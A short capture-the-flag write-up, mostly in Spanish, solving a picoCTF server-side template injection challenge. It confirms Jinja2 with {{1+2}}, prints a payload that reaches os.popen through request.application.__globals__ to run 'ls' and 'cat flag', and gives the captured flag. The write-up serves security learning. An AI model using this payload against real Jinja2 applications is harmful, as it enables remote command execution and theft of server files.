## Descripción
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:61300/)!

## Solución
Se abre la página web y se tiene que se pueden hacer inyecciones ya sea xxs o ssti, se intenta ver si es jinja el motor de plantillas usando {{1+2}} y devuelve 3 por lo tanto si es.
Al buscar como poder ejecutar comandos de shell desde jinja se tiene lo siguiente:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```
Lo cual ejecuta ls y devuelve los directorios de la carpeta actual
Entre los archivos está flag, por lo tanto se cambia el script
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

```
# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}
```

## Referencias
* https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/